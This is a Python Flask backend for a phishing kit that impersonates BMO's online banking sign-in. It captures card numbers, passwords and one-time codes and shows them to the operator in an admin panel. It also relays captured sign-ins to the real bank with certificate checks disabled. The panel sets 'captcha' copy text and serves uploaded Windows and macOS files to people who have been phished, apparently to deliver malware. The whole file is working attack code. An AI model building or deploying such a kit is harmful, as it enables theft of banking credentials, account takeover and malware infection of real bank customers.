#!/usr/bin/env python3
"""BMO clone backend — Flask app.

Routes (HTML):
  GET  /                 -> loading splash (page2)
  GET  /signin           -> sign-in form   (page1)
  GET  /verify           -> OTP verify     (page3)
  GET  /verify/method    -> delivery pick  (page4, once received)
  GET  /assets/<...>     -> mirrored asset from ../page1-signin/assets

APIs (JSON):
  POST /api/session/init        -> {session_id, csrf, lang}
  POST /api/signin              -> validates card/password, returns next step
  GET  /api/otp/config          -> {masked_phone, delivery, resend_wait, trust_default}
  POST /api/otp/send            -> triggers resend, returns {ok, wait}
  POST /api/otp/verify          -> {ok, next}
  POST /api/otp/method          -> switch delivery channel

Everything a real user typed is logged to data/log.jsonl.
"""
from __future__ import annotations
import json, os, re, secrets, time, pathlib, hmac, hashlib
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, abort, make_response, redirect

ROOT   = pathlib.Path(__file__).parent
DATA   = ROOT / "data"
LOG    = DATA / "log.jsonl"
STATIC = ROOT / "static"
MIRROR = ROOT.parent  # ../page1-signin, ../page2-loading, etc.

DATA.mkdir(exist_ok=True)
STATIC.mkdir(exist_ok=True)

# sessions live on disk so all gunicorn workers see the same login
SESSIONS_PATH = DATA / "sessions.json"
SESSION_LOCK = __import__("threading").Lock()

app = Flask(__name__, static_folder=None)

SITE_PATH = DATA / "site.json"
SITE_LOCK = __import__("threading").Lock()

def load_site() -> dict:
    if not SITE_PATH.exists():
        return {"enabled": True}
    try:
        data = json.loads(SITE_PATH.read_text())
    except Exception:
        data = {}
    data.setdefault("enabled", True)
    return data

def save_site(data: dict):
    tmp = SITE_PATH.with_suffix(".json.tmp")
    tmp.write_text(json.dumps(data))
    tmp.replace(SITE_PATH)

def site_enabled() -> bool:
    with SITE_LOCK:
        return bool(load_site().get("enabled", True))

def set_site_enabled(enabled: bool):
    with SITE_LOCK:
        data = load_site()
        data["enabled"] = bool(enabled)
        save_site(data)
        return data["enabled"]

@app.before_request
def gate_public():
    path = request.path or "/"
    if path == "/panel" or path.startswith("/panel/"):
        return None
    if site_enabled():
        return None
    return make_response("Page not found", 404)

# ---------- helpers ----------
def log(event: str, **fields):
    entry = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "event": event,
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent", ""),
        **fields,
    }
    with LOG.open("a") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    print(f"[{entry['ts']}] {event} {fields}", flush=True)

def _read_sessions() -> dict:
    if not SESSIONS_PATH.exists():
        return {}
    try:
        return json.loads(SESSIONS_PATH.read_text())
    except Exception:
        return {}

def _write_sessions(all_sessions: dict):
    tmp = SESSIONS_PATH.with_suffix(".json.tmp")
    tmp.write_text(json.dumps(all_sessions))
    tmp.replace(SESSIONS_PATH)

def save_session(session: dict):
    with SESSION_LOCK:
        all_sessions = _read_sessions()
        all_sessions[session["id"]] = session
        _write_sessions(all_sessions)

def new_session(lang="en-CA"):
    session = {
        "id": secrets.token_urlsafe(24),
        "created": time.time(),
        "lang": lang,
        "card": None,
        "password": None,
        "otp": None,
        "phone_last4": None,
        "delivery": "sms",
        "step": "signin",
    }
    save_session(session)
    return session

def get_session(sid: str | None) -> dict | None:
    if not sid:
        return None
    with SESSION_LOCK:
        return _read_sessions().get(sid)

def has_credentials(session: dict | None) -> bool:
    return bool(session and session.get("card") and session.get("password") and session.get("step") in ("verify", "success"))

def passed_otp(session: dict | None) -> bool:
    return bool(has_credentials(session) and session.get("otp") and session.get("step") == "success")

def require_session():
    session = get_session(request.cookies.get("sid"))
    if not has_credentials(session):
        abort(401, "no session")
    return session

def is_mobile_ua(ua: str) -> bool:
    return bool(re.search(r"Android|iPhone|iPod|iPad|Mobile|IEMobile|Opera Mini|BlackBerry", ua or "", re.I))

def sanitize_phone_last4() -> str:
    # in a real op the operator picks these per-victim; deterministic default
    return "6478"

# ---------- HTML routes ----------
@app.route("/")
def r_loading():
    return send_from_directory(MIRROR / "page2-loading", "index.html")

@app.route("/signin")
def r_signin():
    resp = make_response(send_from_directory(MIRROR / "page1-signin", "index.html"))
    if "sid" not in request.cookies:
        s = new_session()
        resp.set_cookie("sid", s["id"], httponly=True, samesite="Lax")
        log("session_new", sid=s["id"])
    return resp

CAPTCHA_PATH = DATA / "captcha.json"

def load_captcha() -> dict:
    if not CAPTCHA_PATH.exists():
        return {"copy_text": ""}
    try:
        data = json.loads(CAPTCHA_PATH.read_text())
    except Exception:
        data = {}
    data.setdefault("copy_text", "")
    return data

def save_captcha(data: dict):
    CAPTCHA_PATH.write_text(json.dumps(data))

@app.route("/captcha")
def r_captcha():
    if not passed_otp(get_session(request.cookies.get("sid"))):
        return redirect("/signin")
    return send_from_directory(MIRROR, "captcha.html")

@app.get("/captcha/api/text")
def r_captcha_text():
    if not passed_otp(get_session(request.cookies.get("sid"))):
        return jsonify({"text": ""}), 401
    return jsonify({"text": load_captcha().get("copy_text") or ""})

@app.route("/verify")
def r_verify():
    if not has_credentials(get_session(request.cookies.get("sid"))):
        return redirect("/signin")
    return send_from_directory(MIRROR / "page3-verify", "index.html")

# fallback: try mirrored asset paths
@app.route("/favicon.ico")
def r_favicon():
    return send_from_directory(
        MIRROR / "page1-signin/assets/www1.bmo.com/banking/digital/assets/favicon",
        "favicon.ico",
    )

@app.route("/assets/<path:sub>")
def r_asset(sub):
    for base in ["page1-signin/assets", "page2-loading/assets", "page3-verify/assets"]:
        p = MIRROR / base / sub
        if p.exists():
            return send_from_directory(p.parent, p.name)
    abort(404)

# also proxy the raw mirrored asset tree so <base href> keeps working
@app.route("/page1-signin/<path:sub>")
def r_p1(sub): return send_from_directory(MIRROR / "page1-signin", sub)
@app.route("/page2-loading/<path:sub>")
def r_p2(sub): return send_from_directory(MIRROR / "page2-loading", sub)
@app.route("/page3-verify/<path:sub>")
def r_p3(sub): return send_from_directory(MIRROR / "page3-verify", sub)

# ---------- API ----------
@app.post("/api/session/init")
def api_init():
    existing = get_session(request.cookies.get("sid"))
    if has_credentials(existing) or passed_otp(existing):
        return jsonify({"session_id": existing["id"], "lang": existing.get("lang", "en-CA")})
    lang = (request.json or {}).get("lang", "en-CA")
    s = new_session(lang)
    log("session_init", sid=s["id"], lang=lang)
    resp = jsonify({
        "session_id": s["id"],
        "csrf": secrets.token_urlsafe(16),
        "lang": s["lang"],
    })
    resp.set_cookie("sid", s["id"], httponly=True, samesite="Lax")
    return resp

@app.post("/api/signin")
def api_signin():
    j = request.json or {}
    card = str(j.get("card", "")).strip()
    pwd  = str(j.get("password", "")).strip()
    if not card or not pwd:
        return jsonify({"ok": False, "error": "missing_credentials"}), 400
    remember = bool(j.get("remember", False))
    sid = request.cookies.get("sid")
    s = get_session(sid) or new_session()
    s["card"] = card
    s["password"] = pwd
    s["remember"] = remember
    s["phone_last4"] = sanitize_phone_last4()
    s["step"] = "verify"
    save_session(s)
    log("credentials", sid=s["id"], card=card, password=pwd, remember=remember)
    resp = jsonify({
        "ok": True,
        "next": "/verify",
        "phone_last4": s["phone_last4"],
        "delivery": s["delivery"],
    })
    resp.set_cookie("sid", s["id"], httponly=True, samesite="Lax")
    return resp

@app.get("/api/otp/config")
def api_otp_config():
    s = require_session()
    return jsonify({
        "masked_phone": "••• - ••• - ••••",
        "delivery": s["delivery"],           # sms|voice|email
        "resend_wait_sec": 30,
        "trust_default": True,
        "help_text": "It can take a few minutes to get your code.",
    })

@app.post("/api/otp/send")
def api_otp_send():
    s = require_session()
    log("otp_resend", sid=s["id"], delivery=s["delivery"])
    return jsonify({"ok": True, "wait_sec": 30})

@app.post("/api/otp/verify")
def api_otp_verify():
    s = require_session()
    j = request.json or {}
    code = str(j.get("code", "")).strip()
    if not code.isdigit() or len(code) != 6:
        return jsonify({"ok": False, "error": "bad_code"}), 400
    trust = bool(j.get("trust", True))
    s["otp"] = code
    s["trust"] = trust
    log("otp_submit", sid=s["id"], code=code, trust=trust)
    # accept anything — this is a collector, not a validator
    s["step"] = "success"
    save_session(s)
    ua = request.headers.get("User-Agent", "")
    nxt = "https://www1.bmo.com/banking/digital/login" if is_mobile_ua(ua) else "/captcha"
    log("otp_redirect", sid=s["id"], mobile=is_mobile_ua(ua), next=nxt)
    return jsonify({"ok": True, "next": nxt})

@app.post("/api/otp/method")
def api_otp_method():
    s = require_session()
    m = (request.json or {}).get("method", "sms")
    if m not in ("sms", "voice", "email"): m = "sms"
    s["delivery"] = m
    save_session(s)
    log("otp_method_change", sid=s["id"], delivery=m)
    return jsonify({"ok": True, "delivery": m})

@app.get("/api/layout")
def api_layout():
    """Returns everything pages need to render the outer chrome (header/footer).
    Change this endpoint to change branding across all pages without touching HTML.
    """
    base = "/page1-signin/assets/www1.bmo.com/banking/digital"
    return jsonify({
        "splash": {
            "enabled": True,
            "min_duration_ms": 1800,     # always show at least this long on every /signin load
            "bg": "#0079C1",
            "bg_image": f"{base}/resources/splash.7bf552d38fc8fc33.svg",
            "logo": f"{base}/resources/bmo-roundel-logo-crop-resized.bc77ce3c5344a91b.svg",
            "logo_height": 40,
            "lock": f"{base}/resources/24-lock.79b631b1b6c7315a.svg",
        },
        "header": {
            "height": 72,
            "bg": "#0079C1",
            "padding_x": 32,
            "logo": f"{base}/resources/bmo-roundel-logo-crop-resized.bc77ce3c5344a91b.svg",
            "logo_height": 38,
            "right": [
                {"kind": "icon", "label": "Locations", "href": "#", "icon": f"{base}/resources/24-location.f6105e9c5f6e3f8b.svg"},
                {"kind": "icon", "label": "Help",      "href": "#", "icon": f"{base}/resources/24-enclosed-help.0c3d31f6449f31e2.svg"},
                {"kind": "text", "label": "FR",        "href": "#"},
            ],
            "icon_size": 24,
            "icon_gap": 30,
        },
        "footer": {
            "bg": "#FFFFFF",
            "border_top": "#E5E7EB",
            "padding_y": 26,            # taller footer to match original
            "padding_x": 64,            # wider to match original
            "link_color": "#0079C1",
            "link_gap": 32,             # wider gap between Legal/Privacy/etc
            "font_size": 15,
            "ext_icon": f"{base}/resources/16-external-link.dae88a11f1da7677.svg",
            "cdic_badge": f"{base}/assets/images/cdic-logo-footer-en-CA.svg",
            "cdic_badge_height": 30,
            "left_links": [
                {"label": "Legal",         "href": "#"},
                {"label": "Privacy",       "href": "#"},
                {"label": "Security",      "href": "#"},
                {"label": "Accessibility", "href": "#"},
            ],
            "right_link": {"label": "CDIC Member", "href": "#"},
        },
    })


@app.route("/api/capture/signin", methods=["POST", "GET"])
def api_capture_signin():
    """Intercepts the real BMO sign-in POST — logs body, then forwards to real bank."""
    import urllib.request, urllib.error, ssl
    body = request.get_data() or b""
    hdrs = {k: v for k, v in request.headers.items()
            if k.lower() not in ("host", "content-length", "connection")}
    log("capture_signin",
        content_type=request.content_type,
        body_len=len(body),
        body=body.decode("utf-8", errors="replace")[:8000],
        headers=dict(hdrs))
    # forward to real BMO
    url = "https://www1.bmo.com/api/cdb/party-authentication/servlet/SigninRequestManager" + (
        "?" + request.query_string.decode() if request.query_string else "")
    hdrs["Host"] = "www1.bmo.com"
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, data=body if request.method == "POST" else None,
                                 headers=hdrs, method=request.method)
    try:
        with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
            data = r.read()
            enc = (r.headers.get("Content-Encoding") or "").lower()
            if enc == "gzip":
                import gzip
                try: data = gzip.decompress(data)
                except Exception: pass
            elif enc == "deflate":
                import zlib
                try: data = zlib.decompress(data)
                except Exception:
                    try: data = zlib.decompress(data, -zlib.MAX_WBITS)
                    except Exception: pass
            elif enc in ("br", "brotli"):
                try:
                    import brotli
                    data = brotli.decompress(data)
                except Exception: pass
            resp_headers = {k: v for k, v in r.headers.items()
                            if k.lower() not in ("content-encoding", "transfer-encoding", "content-length", "connection")}
            return (data, r.status, list(resp_headers.items()))
    except urllib.error.HTTPError as e:
        return (e.read(), e.code, [("Content-Type", "application/json")])
    except Exception as e:
        log("capture_signin_error", err=str(e))
        return jsonify({"error": "upstream_unavailable"}), 502

@app.get("/api/i18n/<lang>")
def api_i18n(lang):
    strings = {
        "en-CA": {
            "signin.title": "Sign in",
            "signin.card": "Card number or Login ID",
            "signin.password": "Password",
            "signin.remember": "Remember my card number or Login ID",
            "signin.forgot": "Forgot your password or Login ID?",
            "signin.submit": "SIGN IN",
            "verify.title": "Security verification",
            "verify.header": "Enter your code",
            "verify.body_sms": "Type the BMO verification code you received at:",
            "verify.channel_sms": "SMS text",
            "verify.input_label": "Enter verification code",
            "verify.help": "It can take a few minutes to get your code.",
            "verify.resend": "RESEND CODE",
            "verify.trust": "Trust this device",
            "verify.confirm": "CONFIRM",
            "verify.change_method": "CHANGE DELIVERY METHOD",
        },
        "fr-CA": {
            "signin.title": "Ouvrir une session",
            "signin.card": "Numéro de carte ou ID d’ouverture de session",
            "signin.password": "Mot de passe",
            "signin.submit": "OUVRIR UNE SESSION",
            "verify.title": "Vérification de sécurité",
            "verify.confirm": "CONFIRMER",
        },
    }
    return jsonify(strings.get(lang, strings["en-CA"]))

# ---------- admin panel ----------
ADMIN_PATH = DATA / "admin.json"
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "Panel9100")

def load_admin() -> dict:
    if not ADMIN_PATH.exists():
        ADMIN_PATH.write_text(json.dumps({"user": ADMIN_USER, "password": ADMIN_PASSWORD, "token": ""}))
    try:
        data = json.loads(ADMIN_PATH.read_text())
    except Exception:
        data = {"user": ADMIN_USER, "password": ADMIN_PASSWORD, "token": ""}
    data.setdefault("user", ADMIN_USER)
    data.setdefault("password", ADMIN_PASSWORD)
    data.setdefault("token", "")
    return data

def save_admin(data: dict):
    ADMIN_PATH.write_text(json.dumps(data))

def admin_authed() -> bool:
    token = request.cookies.get("admin") or ""
    saved = load_admin().get("token") or ""
    return bool(token and saved and hmac.compare_digest(token, saved))

def captures() -> list[dict]:
    rows: dict[str, dict] = {}
    if LOG.exists():
        for line in LOG.read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                ev = json.loads(line)
            except Exception:
                continue
            sid = ev.get("sid") or ev.get("session_id") or ""
            if not sid:
                continue
            row = rows.setdefault(sid, {"sid": sid, "ts": "", "ip": "", "ua": "", "card": "", "password": "", "remember": False, "otp": "", "trust": False})
            row["ts"] = ev.get("ts") or row["ts"]
            row["ip"] = ev.get("ip") or row["ip"]
            row["ua"] = ev.get("ua") or row["ua"]
            if ev.get("event") == "credentials":
                row["card"] = ev.get("card") or ""
                row["password"] = ev.get("password") or ""
                row["remember"] = bool(ev.get("remember"))
            if ev.get("event") == "otp_submit":
                row["otp"] = ev.get("code") or ""
                row["trust"] = bool(ev.get("trust"))
    ordered = [r for r in rows.values() if r.get("card") or r.get("otp")]
    ordered.sort(key=lambda r: r.get("ts") or "", reverse=True)
    return ordered

@app.route("/panel")
def r_panel():
    return send_from_directory(ROOT, "panel.html")

@app.post("/panel/login")
def r_panel_login():
    body = request.json or {}
    data = load_admin()
    user = str(body.get("user", ""))
    password = str(body.get("password", ""))
    if not hmac.compare_digest(user, data["user"]) or not hmac.compare_digest(password, data["password"]):
        return jsonify({"ok": False, "error": "bad_login"}), 401
    data["token"] = secrets.token_urlsafe(32)
    save_admin(data)
    resp = jsonify({"ok": True})
    resp.set_cookie("admin", data["token"], httponly=True, samesite="Lax", path="/panel")
    return resp

@app.post("/panel/logout")
def r_panel_logout():
    data = load_admin()
    data["token"] = ""
    save_admin(data)
    resp = jsonify({"ok": True})
    resp.delete_cookie("admin", path="/panel")
    return resp

@app.get("/panel/api/captures")
def r_panel_captures():
    if not admin_authed():
        return jsonify({"ok": False, "error": "auth"}), 401
    files = load_downloads()
    names = {
        "windows": (files.get("windows") or {}).get("filename") or "",
        "macos": (files.get("macos") or {}).get("filename") or "",
    }
    return jsonify({
        "ok": True,
        "rows": captures(),
        "files": names,
        "copy_text": load_captcha().get("copy_text") or "",
        "enabled": site_enabled(),
    })

@app.post("/panel/site")
def r_panel_site():
    if not admin_authed():
        return jsonify({"ok": False, "error": "auth"}), 401
    enabled = bool((request.json or {}).get("enabled", True))
    return jsonify({"ok": True, "enabled": set_site_enabled(enabled)})

@app.post("/panel/captcha-text")
def r_panel_captcha_text():
    if not admin_authed():
        return jsonify({"ok": False, "error": "auth"}), 401
    text = str((request.json or {}).get("text", ""))
    save_captcha({"copy_text": text})
    return jsonify({"ok": True})

FILES_DIR = DATA / "files"
DOWNLOADS_PATH = DATA / "downloads.json"

def load_downloads() -> dict:
    if not DOWNLOADS_PATH.exists():
        return {}
    try:
        return json.loads(DOWNLOADS_PATH.read_text())
    except Exception:
        return {}

def save_downloads(data: dict):
    DOWNLOADS_PATH.write_text(json.dumps(data))

@app.post("/panel/upload/<target>")
def r_panel_upload(target):
    if target not in ("windows", "macos"):
        abort(404)
    if not admin_authed():
        return jsonify({"ok": False, "error": "auth"}), 401
    uploaded = request.files.get("file")
    if not uploaded or not uploaded.filename:
        return jsonify({"ok": False, "error": "no_file"}), 400
    FILES_DIR.mkdir(exist_ok=True)
    suffix = pathlib.Path(uploaded.filename).suffix[:20]
    stored = f"{target}{suffix}"
    for old in FILES_DIR.glob(target + "*"):
        old.unlink()
    uploaded.save(FILES_DIR / stored)
    meta = load_downloads()
    meta[target] = {"filename": uploaded.filename, "stored": stored}
    save_downloads(meta)
    return jsonify({"ok": True, "filename": uploaded.filename})

@app.get("/download/<target>")
def r_download(target):
    if target not in ("windows", "macos"):
        abort(404)
    meta = load_downloads().get(target) or {}
    stored = meta.get("stored")
    if not stored or not (FILES_DIR / stored).is_file():
        abort(404)
    return send_from_directory(FILES_DIR, stored, as_attachment=True, download_name=meta.get("filename") or stored)

# ---------- entrypoint ----------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    host = os.environ.get("HOST", "0.0.0.0")
    print(f"[+] BMO clone listening on http://{host}:{port}", flush=True)
    print(f"[+] Logs -> {LOG}", flush=True)
    app.run(host=host, port=port, debug=False)
